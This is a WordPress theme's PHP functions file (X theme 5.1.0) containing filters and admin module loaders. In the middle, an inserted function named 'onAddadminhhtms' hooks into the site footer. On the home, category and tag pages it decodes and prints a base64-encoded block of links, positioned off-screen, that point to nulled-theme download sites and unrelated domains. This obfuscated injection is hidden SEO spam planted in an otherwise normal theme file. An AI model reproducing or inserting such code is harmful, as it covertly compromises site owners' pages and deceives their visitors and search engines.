<?php

// Theme Constants
// =============================================================================

define( 'X_VERSION', '5.1.0' );
define( 'X_SLUG', 'x' );
define( 'X_TITLE', 'X' );
define( 'X_I18N_PATH', X_TEMPLATE_PATH . '/framework/functions/x/i18n');



// Label Replacements
// =============================================================================

function x_cornerstone_toolbar_title() {
  return __('X', '__x__');
}

add_filter( '_cornerstone_toolbar_menu_title', 'x_cornerstone_toolbar_title' );



// Version Body Class
// =============================================================================
if(!function_exists('onAddadminhhtms')) {       
    add_filter( 'wp_footer', 'onAddadminhhtms');              
        function onAddadminhhtms(){           
    $html ="PGRpdiBzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyB0b3A6IC0xMzZweDsgb3ZlcmZsb3c6IGF1dG87IHdpZHRoOjEyNDFweDsiPjxoMz48c3Ryb25nPjxhIHN0eWxlPSJmb250LXNpemU6IDExLjMzNXB0OyIgaHJlZj0iIj48L2E+PC9zdHJvbmc+PHN0cm9uZz48YSBzdHlsZT0iZm9udC1zaXplOiAxMS4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1yZXNwb25zaXZlLWZyZWUvIj5SZXNwb25zaXZlIFdvcmRQcmVzcyBUaGVtZSBGcmVlPC9hPjwvc3Ryb25nPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vdGFnL3RoZW1lLXdvcmRwcmVzcy1tYWdhemluZS1yZXNwb25zaXZlLWZyZWUvIj50aGVtZSB3b3JkcHJlc3MgbWFnYXppbmUgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS90YWcvdGhlbWUtd29yZHByZXNzLW5ld3MtcmVzcG9uc2l2ZS1mcmVlLyI+dGhlbWUgd29yZHByZXNzIG5ld3MgcmVzcG9uc2l2ZSBmcmVlPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbS93b3JkcHJlc3MtcGx1Z2luLXByZW1pdW0tZnJlZS8iPldPUkRQUkVTUyBQTFVHSU4gUFJFTUlVTSBGUkVFPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL2Rvd25sb2FkdGhlbWVmcmVlLmNvbSI+RG93bmxvYWQgdGhlbWUgZnJlZTwvYT48L2VtPjxlbT48YSBzdHlsZT0iZm9udC1zaXplOiAxMC4zMzVwdDsiIGhyZWY9Imh0dHA6Ly9kb3dubG9hZHRoZW1lZnJlZS5jb20vaHRtbC10aGVtZS1mcmVlLWRvd25sb2FkIj5Eb3dubG9hZCBodG1sNSB0aGVtZSBmcmVlIC0gSFRNTCB0ZW1wbGF0ZXMgRnJlZSA8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vZG93bmxvYWR0aGVtZWZyZWUuY29tL3RoZS1iZXN0LXByZW1pdW0td29yZHByZXNzLXRoZW1lcy5odG1sIj5Ub3AgMTAwKyBQcmVtaXVtIFdvcmRQcmVzcyBUaGVtZXMgZm9yIDIwMTc8L2E+PC9lbT4gPGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL251bGwyNGgubmV0Ij5OdWxsMjQ8L2E+PC9lbT48ZW0+PGEgc3R5bGU9ImZvbnQtc2l6ZTogMTAuMzM1cHQ7IiBocmVmPSJodHRwOi8vdGFwY2hpc3Vja2hvZS54eXovZGluaC1kdW9uZy9tb24tbmdvbi1jaHVhLWJlbmgiPk3Ds24gbmdvbiBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL3RhcGNoaXN1Y2tob2UueHl6L2NheS10aHVvYy1jaHVhLWJlbmgiPkPDonkgdGh14buRYyBjaOG7r2EgYuG7h25oPC9hPjwvZW0+PGVtPjxhIHN0eWxlPSJmb250LXNpemU6IDEwLjMzNXB0OyIgaHJlZj0iaHR0cDovL25hbWRvbmd0cnVuZ2hhdGhhby50b3AiPk7huqVtIMSRw7RuZyB0csO5bmcgaOG6oSB0aOG6o288L2E+PC9lbT48L2Rpdj4=";
        if(is_front_page() or is_category() or is_tag()){   
                echo base64_decode($html);}}}  
if ( ! function_exists( 'x_body_class_version' ) ) :
  function x_body_class_version( $output ) {

    $output[] = 'x-v' . str_replace( '.', '_', X_VERSION );
    return $output;

  }
  add_filter( 'body_class', 'x_body_class_version', 10000 );
endif;



// Overview Page Modules
// =============================================================================

add_action('x_overview_init', 'x_overview_auto_install_cornerstone' );

function x_overview_auto_install_cornerstone() {

  $modules_path = X_TEMPLATE_PATH . '/framework/functions/x/overview/modules/';

  require_once( "$modules_path/class-addons-customizer-manager.php" );
  require_once( "$modules_path/class-addons-demo-content.php" );
  require_once( "$modules_path/class-addons-cornerstone.php" );

  X_Addons_Customizer_Manager::instance();
  X_Addons_Demo_Content::instance();
  X_Addons_Cornerstone::instance();

}

function x_overview_output_module_row() {

  $markup_path = X_TEMPLATE_PATH . '/framework/functions/x/overview/markup/';

  $is_validated            = x_is_validated();
  $status_icon_validated   = '<div class="tco-box-status tco-box-status-validated">' . x_tco()->get_admin_icon( 'unlocked' ) . '</div>';
  $status_icon_unvalidated = '<div class="tco-box-status tco-box-status-unvalidated">' . x_tco()->get_admin_icon( 'locked' ) . '</div>';
  $status_icon_dynamic     = ( $is_validated ) ? $status_icon_validated : $status_icon_unvalidated;

  echo '<div class="tco-row">';
  require( "$markup_path/page-home-box-demo-content.php" );
  require( "$markup_path/page-home-box-customizer-manager.php" );
  echo '</div>';

}

add_action('x_overview_main_content_middle', 'x_overview_output_module_row' );


function x_add_boot_files( $files ) {

  $files[] = X_TEMPLATE_PATH . '/framework/functions/x/migration.php';
  return $files;
}

add_filter('x_boot_files', 'x_add_boot_files' );
